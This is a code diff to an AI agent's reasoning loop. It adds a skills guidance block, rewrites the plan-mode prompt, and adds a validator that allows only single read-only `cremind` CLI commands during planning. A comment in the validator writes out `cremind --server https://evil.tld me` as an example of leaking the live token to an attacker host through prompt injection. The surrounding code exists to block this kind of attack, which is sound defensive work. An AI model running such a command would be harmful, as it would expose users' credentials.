@@ -27,6 +27,7 @@ from __future__ import annotations
 import asyncio
 import json
 import platform
+import re
 import uuid
 from typing import TYPE_CHECKING, Any, AsyncGenerator, Dict, List, Optional, Tuple
 
@@ -128,7 +129,7 @@ For any request that contains a time expression you MUST first call the
 `datetime_parser` tool to normalise it; if it also contains a recurring
 schedule you MUST call the `scheduler` tool instead. Do this before calling
 other tools that need the normalised time.
-{reasoning_guidance}{builtin_tools_guidance}{search_guidance}{coding_delegation_guidance}
+{reasoning_guidance}{builtin_tools_guidance}{skills_guidance}{search_guidance}{coding_delegation_guidance}
 PRESERVE THE USER'S LANGUAGE: any human-facing value you put in a tool argument
 -- especially the title/name of something you create on the user's behalf (a
 schedule event, reminder, note, or task) and any message shown to the user --
@@ -250,21 +251,39 @@ Executor.
 PLAN_MODE_PLANNING_GUIDANCE = '''
 
 PLAN MODE — PLANNING PHASE: The user wants a plan before any changes are made.
-Work READ-ONLY in this phase: you may read files, search, and inspect, but do NOT
-modify anything, run mutating commands, or create/edit files — only the plan
-tools below write anything.
+Work READ-ONLY in this phase: you may read files, search, inspect, LOAD skills,
+and run single read-only `cremind` listing commands (list / get / show / status /
+catalog), but do NOT modify anything, run any other shell command, or create/edit
+files — only the plan tools below write anything.
 1. If the user's message is telling you to carry out a plan that was ALREADY
    written earlier in this conversation (e.g. "continue", "go ahead", "implement
    the plan" — even after a previous cancel), treat that as approval: stop
    planning, maintain a live todo list with `update_todos`, and execute that plan
    to completion using your normal tools.
-2. Otherwise, if you have NOT yet asked clarifying questions in this planning
-   cycle, first research the request read-only, then call `ask_user_question`
-   with 1-4 focused questions and STOP — end your turn. Always ask at least one
-   clarifying question before writing a plan.
-3. Once the user has answered your questions (their answers appear earlier in
-   this turn's history), call `write_plan` with a detailed, complete Markdown
-   plan, then STOP — end your turn and wait for the user's Accept/Cancel.
+2. INVESTIGATE FIRST — before you ask the user anything, find out what THIS
+   Cremind system actually offers for this request:
+   (a) read the built-in tools and the SKILLS listed in your instructions above;
+   (b) LOAD every skill whose description touches the request — a skill call only
+       loads its SKILL.md and performs nothing, and those instructions are the
+       ONLY source of its real capabilities, prerequisites and commands, so a
+       plan built on an unloaded skill is guesswork;
+   (c) search the documentation for the relevant feature and CLI docs;
+   (d) search your memory for what the user has already set up;
+   (e) run read-only `cremind ... list/get/show/status/catalog` commands to see
+       live state — which channels, tools, skills, models and profiles exist.
+   Never ask the user something a loaded skill, a document, or a listing can
+   answer for you.
+3. ASK — then call `ask_user_question` with 1-4 questions covering only what the
+   user alone can decide (their preferences, scope, accounts, trade-offs), each
+   offering the real options this system supports, and STOP — end your turn.
+   Always ask at least once before writing a plan.
+4. CONTINUE RESEARCHING — the user's answers arrive as your next turn. Load any
+   further skill, doc or listing those answers point to. If something essential
+   is still unclear after that, call `ask_user_question` again and STOP (at most
+   3 question rounds in one planning cycle); otherwise go on to write the plan.
+5. WRITE — call `write_plan` only once every step of the plan names the concrete
+   tool, skill, or `cremind` command that performs it, as verified in your
+   research — then STOP, end your turn and wait for the user's Accept/Cancel.
 AUTOMATION REQUESTS: If the request is to set up a recurring or event-triggered
 automation (a schedule, a file watcher, or a skill event), the plan's deliverable
 is the REGISTRATION — not a one-off run. The step list you write runs on EVERY
@@ -1025,6 +1044,204 @@ def _build_builtin_tools_guidance(tools) -> str:
     return "\n" + header + "\n" + "\n".join(lines) + "\n"
 
 
+def _build_skills_guidance(tools) -> str:
+    """Explain what a SKILL is, and list the ones enabled this run.
+
+    A skill reaches the model as one ordinary-looking function in the ``tools=``
+    block, so nothing in the schema distinguishes "an action I can perform" from
+    "a bundle of instructions I must load first". The model therefore treats the
+    one-line description as the whole story and plans around a capability it has
+    never actually read — the plan-mode incident this block exists to fix.
+
+    Built from the run's ENABLED tool set only (exactly like
+    ``_build_builtin_tools_guidance``), so the block is byte-stable within a run
+    and changes only when the enabled skill SET changes. Deliberately NOT derived
+    from ``_loaded_skill_ids``: that changes mid-run on every skill load, and
+    coupling the cached system prefix to it would bust the prompt cache each time.
+    Returns "" when no skill is enabled. Wrapped ``'\\n...\\n'`` to match the other
+    guidance blocks' spacing.
+    """
+    ids = [
+        tool.tool_id
+        for tool in tools
+        if getattr(tool, "tool_type", None) is ToolType.SKILL
+    ]
+    if not ids:
+        return ""
+    header = (
+        "SKILLS — WHAT THEY ARE: A skill is an installed bundle of instructions "
+        "(SKILL.md) plus scripts covering one domain. Each enabled skill appears "
+        "in your tools as ONE function named after it and marked [Skill]. Calling "
+        "that function performs NO action: it only LOADS the skill's full "
+        "instructions into this conversation, which is a read-only step. The "
+        "one-line description you see is only a summary — the real capabilities, "
+        "prerequisites, credentials, commands and limits live in the SKILL.md — so "
+        "LOAD a skill before relying on it, planning around it, or telling the "
+        "user what it can do, then act on the loaded instructions with your other "
+        "tools."
+    )
+    listing = "Enabled skills: " + ", ".join(f"`{i}`" for i in ids) + "."
+    return "\n" + header + "\n" + listing + "\n"
+
+
+# ── read-only `cremind` commands allowed during the plan PLANNING phase ──────
+#
+# Planning is read-only, so the whole Shell Executor is normally refused. But the
+# planner has to be able to SEE the live system (which channels, tools, skills,
+# models and profiles exist) or it plans against a system it is guessing at — and
+# the documentation-search directive explicitly tells it to run these listings.
+# So a narrow carve-out: ONE plain `cremind` command whose command word is a
+# known read-only verb.
+#
+# Every verb here was checked against its real definition in ``app/cli/commands``.
+# Deliberately EXCLUDED despite reading like inspection: ``working`` and
+# ``components`` are ``cremind clean working`` / ``cremind clean components``,
+# which WIPE profile data; ``policy`` / ``members`` / ``available`` exist only at
+# ``cremind channels groups <verb>`` (depth 3), which the position rule below
+# rejects anyway.
+_PLAN_READONLY_CLI_VERBS: frozenset = frozenset({
+    "capabilities", "catalog", "check", "current", "cwd", "exportable",
+    "get", "get-args", "heads", "health", "history", "inspect", "leaves",
+    "list", "me", "memory", "models", "options", "schema", "senders",
+    "settings", "show", "status", "usage", "version", "which",
+})
+
+# Command GROUPS refused outright, whatever the verb. ``cremind auth show
+# --profile <other>`` prints that profile's raw JWT straight off disk — it never
+# contacts the server, so the exec_shell-injected CREMIND_TOKEN does not confine
+# it, and it walks straight through the profile boundary that
+# ``system_file._allowed_roots`` enforces by keeping the tokens directory out of
+# the agent's reach. "Read-only" is not the same as "safe to read".
+_PLAN_BLOCKED_CLI_GROUPS: frozenset = frozenset({"auth"})
+
+# Real two-word command groups whose read-only verbs sit at depth 3, mapped to
+# the verbs that are read-only IN THAT GROUP (verified by walking the Typer tree
+# in ``app/cli/main.py``). Listed EXPLICITLY rather than inferred from token
+# shape: a "the verb may be anywhere in the first three words" rule would also
+# admit ``cremind conv rename list`` and ``cremind tools set list``, which
+# rename and reconfigure. Without this table ``cremind llm providers models`` is
+# unreachable — which would make the ``models`` verb dead and break the
+# guidance's promise that the planner can see which models exist.
+#
+# A MAPPING, not a set of pairs crossed with the global verb list, because a
+# verb's meaning is per-group: ``status`` reads under ``proc`` and ``server``,
+# but ``cremind calendar schedule status <id> cancelled`` is a SETTER that
+# pauses or cancels one of the profile's automations. Crossing pairs with verbs
+# let that through, so each pair now names its own readers.
+_PLAN_READONLY_CLI_GROUPS: Dict[str, frozenset] = {
+    "agents config": frozenset({"get"}),
+    "calendar schedule": frozenset({"list"}),  # NOT "status" — that one writes
+    "channels groups": frozenset({"list"}),
+    "llm model-groups": frozenset({"get"}),
+    "llm providers": frozenset({"list", "models"}),
+    "proc autostart": frozenset({"list"}),
+    "profile agent-name": frozenset({"get"}),
+    "profile instructions": frozenset({"get"}),
+    "profile persona": frozenset({"get"}),
+    "setup server-config": frozenset({"get"}),
+}
+
+# Options that turn an allowed read into something that never ends. A tailing
+# command makes exec_shell classify the call as ``long_running``: it mints a
+# process id, creates a log directory and a state file, and keeps the child
+# alive in the process registry for a 24-hour TTL — so the "read-only" planning
+# phase would leave a process running and disk state behind, outliving the plan
+# the user then rejects. Rejected wherever they appear in the command, since a
+# flag's position does not change what it does.
+# ``tests/agent/test_plan_mode_gating.py`` walks the real CLI tree and fails if
+# an admitted command ever gains a streaming or file-writing option that is not
+# listed here, so this stays a maintained invariant rather than a snapshot.
+_PLAN_REJECTED_CLI_OPTIONS: frozenset = frozenset({
+    "--follow", "-f", "-F", "--stream", "--tail", "--watch",
+    "--out", "-o", "--output", "--file",
+})
+
+# Anything that could chain, redirect, or substitute a SECOND command onto the
+# first. A read-only verb is only read-only if it is the whole command.
+_SHELL_METACHARACTERS = ";&|<>`$(){}\n\r"
+
+# Root-level flags accepted before the command group (see ``cremind --help``),
+# split by whether they consume the FOLLOWING token as their value. Knowing this
+# is what lets the command word be located by POSITION rather than by scanning,
+# which is what stops `cremind tools --opt list delete x` from being waved
+# through on its flag's value.
+#
+# ``--server`` and ``--token`` are deliberately NOT accepted. A read-only VERB
+# says nothing about WHERE the command sends the profile's credential:
+# ``cremind --server https://evil.tld me`` is a listing by verb, but the CLI
+# prefers the flag over the injected CREMIND_SERVER and attaches
+# ``Authorization: Bearer <CREMIND_TOKEN>`` to whatever base URL it is handed,
+# so it exfiltrates the live JWT — reachable by prompt injection, since the
+# planning phase is explicitly told to go and read documents and skills. Neither
+# flag is ever needed here: exec_shell already injects both values into the
+# child environment. An unrecognised leading flag hits the ``return False``
+# branch below, which rejects the ``--server=x`` form too.
+_CREMIND_ROOT_FLAGS_BOOL: frozenset = frozenset({"--json", "--help", "-h"})
+_CREMIND_ROOT_FLAGS_VALUE: frozenset = frozenset({"--profile", "-p"})
+
+_CREMIND_GROUP_RE = re.compile(r"[a-z][a-z-]*\Z")
+
+
+def _is_readonly_cremind_command(command: str) -> bool:
+    """True for a single, plain, read-only ``cremind ...`` invocation.
+
+    Accepts ``cremind <verb>`` (a root command such as ``cremind me``),
+    ``cremind <group> <verb>`` (``cremind channels catalog --json``) and
+    ``cremind <known nested group> <verb>`` (``cremind llm providers models``),
+    optionally behind the root flags above. Everything else — a second chained
+    command, a shell metacharacter, an unknown leading flag, a blocked group, an
+    unknown nested group, or a verb that is not on the read-only list — is
+    rejected. Pure and side-effect free so it can be unit-tested directly.
+    """
+    if not isinstance(command, str):
+        return False
+    text = command.strip()
+    if not text:
+        return False
+    if any(ch in text for ch in _SHELL_METACHARACTERS):
+        return False
+    tokens = text.split()
+    if tokens[0] != "cremind":
+        return False
+    # A rejected option anywhere disqualifies the command: the verb says what is
+    # being read, the options say whether it ever stops or writes a file.
+    if any(t.partition("=")[0] in _PLAN_REJECTED_CLI_OPTIONS for t in tokens[1:]):
+        return False
+
+    rest = tokens[1:]
+    i = 0
+    while i < len(rest) and rest[i].startswith("-"):
+        flag, sep, _value = rest[i].partition("=")
+        if flag in _CREMIND_ROOT_FLAGS_BOOL:
+            i += 1
+        elif flag in _CREMIND_ROOT_FLAGS_VALUE:
+            # ``--profile=admin`` carries its value; ``--profile admin`` eats the
+            # next token. A trailing flag with no value runs i past the end, and
+            # the emptiness check below then rejects the command.
+            i += 1 if sep else 2
+        else:
+            return False  # unknown flag before the command word
+    rest = rest[i:]
+    if not rest:
+        return False
+
+    if rest[0] in _PLAN_BLOCKED_CLI_GROUPS:
+        return False
+    if rest[0] in _PLAN_READONLY_CLI_VERBS:
+        return True
+    if _CREMIND_GROUP_RE.match(rest[0]) is None:
+        return False
+    if len(rest) >= 2 and rest[1] in _PLAN_READONLY_CLI_VERBS:
+        return True
+    # Depth 3, but only for a group pair that really exists, and only for the
+    # verbs that are readers in THAT pair — never for an arbitrary word followed
+    # by a read-only-looking one.
+    return (
+        len(rest) >= 3
+        and rest[2] in _PLAN_READONLY_CLI_GROUPS.get(f"{rest[0]} {rest[1]}", frozenset())
+    )
+
+
 class _LeafOutcome:
     """Collected output of one leaf tool run (so leaves can run concurrently)."""
 
@@ -1075,6 +1292,12 @@ class ReasoningAgent:
     # Class-level default keeps ``__new__`` construction (tests) and direct
     # ``_build_instruction`` calls from tripping on a missing attribute.
     _builtin_tools_guidance: str = ""
+
+    # Skills catalogue block (what a skill is + the enabled skill ids); ``__init__``
+    # recomputes it from the run's enabled tools (empty unless a skill is on).
+    # Class-level default keeps ``__new__`` construction (tests) and direct
+    # ``_build_instruction`` calls from tripping on a missing attribute.
+    _skills_guidance: str = ""
 
     # Frozen long-term-memory section; ``_loop`` fills it once per run from the
     # per-process snapshot. Class-level default keeps ``__new__`` construction and
@@ -1352,6 +1575,11 @@ class ReasoningAgent:
         # that declares an authored description; empty otherwise. Static for the
         # run (group-level), so the system prompt stays byte-identical per step.
         self._builtin_tools_guidance = _build_builtin_tools_guidance(self._tools)
+        # Skills catalogue — what a skill IS (an instruction bundle that must be
+        # loaded before it can be relied on) plus the enabled skill ids. Same
+        # enabled-set-only contract as the block above, so it is static for the
+        # run and a mid-run skill load never touches the cached system prefix.
+        self._skills_guidance = _build_skills_guidance(self._tools)
 
         self.max_steps = max_steps if max_steps is not None else cfg.max_steps
         self.current_step_count = 0
@@ -1596,6 +1824,9 @@ class ReasoningAgent:
             current_user_working_directory=cwd,
             reasoning_guidance=REASONING_GUIDANCE if self._inject_reasoning_guidance else "",
             builtin_tools_guidance=self._builtin_tools_guidance,
+            # ``getattr`` (like the coding block below) tolerates the skeleton
+            # agents tests build via ``__new__``, which never run ``__init__``.
+            skills_guidance=getattr(self, "_skills_guidance", ""),
             search_guidance=self._search_guidance,
             coding_delegation_guidance=getattr(self, "_coding_delegation_guidance", ""),
             long_term_memory=self._long_term_memory_block,
@@ -1670,8 +1901,14 @@ class ReasoningAgent:
             else:
                 marker = (
                     "[Plan mode — PLANNING phase: do NOT execute the task yet. "
-                    "Work read-only; ask your clarifying questions with "
-                    "`ask_user_question`, then call `write_plan` and stop.]"
+                    "Investigate first — LOAD every relevant skill (a skill call "
+                    "only loads its instructions and performs nothing), search the "
+                    "docs, and list live state with read-only `cremind` commands — "
+                    "then ask what only the user can decide with "
+                    "`ask_user_question` and stop. If this message answers your "
+                    "questions, research what the answers imply, ask again only if "
+                    "something essential is still unclear, otherwise call "
+                    "`write_plan` and stop.]"
                 )
             return f"{marker}\n\n{self._current_query}"
         # Event runs always run in reasoning mode (plan mode is force-disabled for
@@ -1829,9 +2066,9 @@ class ReasoningAgent:
                 return None  # nothing left to expose — drop the stub entirely
             properties: Dict[str, Any] = {"subscribe": subscribe_spec}
             description = (
-                f"{tool.description} Its instructions are already loaded in this "
-                "conversation — follow them directly to act (do NOT call this to "
-                "use it). Call this ONLY to subscribe to one of its events."
+                f"[Skill] {tool.description} Its instructions are already loaded "
+                "in this conversation — follow them directly to act (do NOT call "
+                "this to use it). Call this ONLY to subscribe to one of its events."
             )
             parameters: Dict[str, Any] = {
                 "type": "object",
@@ -1843,16 +2080,17 @@ class ReasoningAgent:
                 SKILL_REQUEST_ARG: {
                     "type": "string",
                     "description": (
-                        "What you want this skill to do right now (one-shot use). "
-                        "Provide this to load and use the skill."
+                        "What you intend to do with this skill (one line). "
+                        "Provide it to load the skill's instructions."
                     ),
                 },
             }
             if subscribe_spec is not None:
                 properties["subscribe"] = subscribe_spec
             description = (
-                f"{tool.description} Call this to use the skill; pass the "
-                "user's request. The skill's instructions load on first use."
+                f"[Skill] {tool.description} Calling this only LOADS the skill's "
+                "full instructions (SKILL.md) as the result — it performs no "
+                "action; then act on those instructions with your other tools."
             )
             parameters = {"type": "object", "properties": properties}
 
@@ -2057,14 +2295,39 @@ class ReasoningAgent:
         ("scheduler", "schedule_create"),
     })
 
-    def _is_plan_blocked_leaf(self, entry) -> bool:
-        return (
+    def _is_plan_blocked_leaf(self, entry, args=None) -> bool:
+        """Whether this call must be refused because planning is read-only.
+
+        ``args`` is the call's arguments when available; without them the answer
+        is the conservative one (blocked), so a caller that cannot supply them
+        never accidentally widens the gate.
+        """
+        if not (
             self._mode == "plan"
             and self._plan_phase == "planning"
             and bool(entry)
             and entry[0] == "leaf"
             and (entry[1].tool_id, entry[2]) in self._PLAN_BLOCKED_LEAVES
-        )
+        ):
+            return False
+        # Carve-out: a single read-only `cremind` listing is how the planner sees
+        # the live system, so it is allowed through the otherwise-blocked shell.
+        # stdin is refused with it — a command fed input is being driven, not
+        # merely read — and so is holding the pipe open for a later write.
+        # ``current_shell_directory`` is refused too: ``ExecShellTool.run``
+        # ``os.makedirs()`` that path before running, so honouring it would let a
+        # "read-only" listing create directories on disk. A `cremind` command
+        # talks to the server over HTTP and never needs a working directory, so
+        # requiring it to be empty costs the planner nothing.
+        if (entry[1].tool_id, entry[2]) == ("exec_shell", "exec_shell") and isinstance(args, dict):
+            if (
+                _is_readonly_cremind_command(args.get("command") or "")
+                and not (args.get("stdin") or "")
+                and not args.get("keep_stdin_open")
+                and not str(args.get("current_shell_directory") or "").strip()
+            ):
+                return False
+        return True
 
     # Leaves whose result must reach the model whole, exempt from the per-tool
     # token clamp (same rationale as a skill load, which passes truncate=False).
@@ -2384,7 +2647,7 @@ class ReasoningAgent:
                 (c, n, a, e) for (c, n, a, e) in resolved
                 if e and e[0] == "leaf"
                 and not self._is_event_blocked_leaf(e, a)
-                and not self._is_plan_blocked_leaf(e)
+                and not self._is_plan_blocked_leaf(e, a)
             ]
             outcomes: Dict[str, "_LeafOutcome"] = {}
             if leaf_calls:
@@ -2412,12 +2675,20 @@ class ReasoningAgent:
                         step_no, call_id, [Part(root=TextPart(text=obs))]
                     )
                     continue
-                if self._is_plan_blocked_leaf(entry):
+                if self._is_plan_blocked_leaf(entry, args):
                     obs = (
                         "Plan mode (planning phase) is READ-ONLY — this action was "
-                        "NOT executed. Do not try to carry out the task yet. "
-                        "Research with read-only tools, ask the user what you need "
-                        "with `ask_user_question`, and call `write_plan` when ready; "
+                        "NOT executed. Do not try to carry out the task yet. In "
+                        "this phase the shell runs ONLY a single read-only "
+                        "`cremind <group> <list|get|show|status|catalog|...>` "
+                        "command (no pipes, no chaining, no stdin); everything "
+                        "else waits for the execution phase. Keep researching "
+                        "instead: LOAD the skills relevant to this request (a "
+                        "skill call only loads its instructions), search the "
+                        "documentation, and list live state with those read-only "
+                        "commands. Then ask the user what only they can decide "
+                        "with `ask_user_question`, and call `write_plan` once "
+                        "every step names a real tool, skill or command; "
                         "execution begins only after the user accepts the plan."
                     )
                     self._append_tool_result(call_id, obs, fn_name=name)
@@ -3215,6 +3486,18 @@ class ReasoningAgent:
         events_note = self._render_events_hint(tool)
         if events_note:
             sections.append(events_note)
+        # A load during the read-only planning phase is RESEARCH, not a hand-off
+        # to execution: the SKILL.md body is written imperatively ("run this
+        # script"), so without this the model reads the instructions it just
+        # loaded as a licence to start running them. Rides the tool result, so
+        # the cached system prefix is untouched.
+        if self._mode == "plan" and self._plan_phase == "planning":
+            sections.append(
+                "[Plan mode — planning phase: these instructions are research "
+                "material. Do NOT run this skill's scripts or commands now; use "
+                "them to ground the plan you are writing. The execution phase "
+                "runs them after the user accepts the plan.]"
+            )
         obs = "\n\n".join(sections)
 
         self._loaded_skill_ids.add(tool.tool_id)
